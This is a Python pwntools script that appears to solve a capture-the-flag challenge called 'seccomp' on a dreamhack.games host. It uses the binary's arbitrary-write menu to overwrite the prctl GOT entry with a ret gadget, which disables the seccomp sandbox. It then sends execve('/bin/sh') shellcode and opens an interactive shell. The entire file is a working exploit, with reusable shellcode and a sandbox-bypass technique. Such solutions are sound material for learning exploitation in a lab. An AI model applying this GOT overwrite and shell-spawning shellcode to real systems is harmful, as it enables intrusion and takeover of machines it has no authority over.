#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./seccomp', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+264
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 18641)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def read_shellcode(shellcode):
    sl(b'1')
    sla(b'shellcode: ', shellcode)
    io.recvuntil(b'> ')

def execute_shellcode():
    sl(b'2')
    #io.recvuntil(b'> ')

def write_address(addr, value):
    sl(b'3')
    sla(b'addr: ', str(addr).encode())
    sla(b'value', str(value).encode())
    io.recvuntil(b'> ')

shellcode = asm(
    '''
    lea rdi, [rip + binsh]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
    binsh:
        .asciz "/bin/sh"
    ''', arch = 'amd64', os = 'linux')

ret = 0x0000000000400709
prctl_got = elf.got['prctl']

io = start()
io.recvuntil(b'> ')

write_address(prctl_got, ret)
read_shellcode(shellcode)
execute_shellcode()

io.interactive()